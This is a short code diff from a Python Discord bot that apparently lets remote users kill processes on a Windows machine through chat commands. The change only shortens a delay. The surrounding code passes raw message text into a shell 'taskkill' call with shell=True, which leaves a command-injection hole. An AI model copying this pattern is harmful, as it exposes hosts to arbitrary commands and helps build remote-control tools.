@@ -208,7 +208,7 @@ elif message.content[:5] == '.kill':
         #.log Process list is not generated, but valid process name is provided 
         stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()}', capture_output=True, shell=True).stdout).strip()
         #.log Tried to kill provided process 
-        await asyncio.sleep(1)
+        await asyncio.sleep(0.5)
         if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
             #.log Process is not running anymore 
             embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
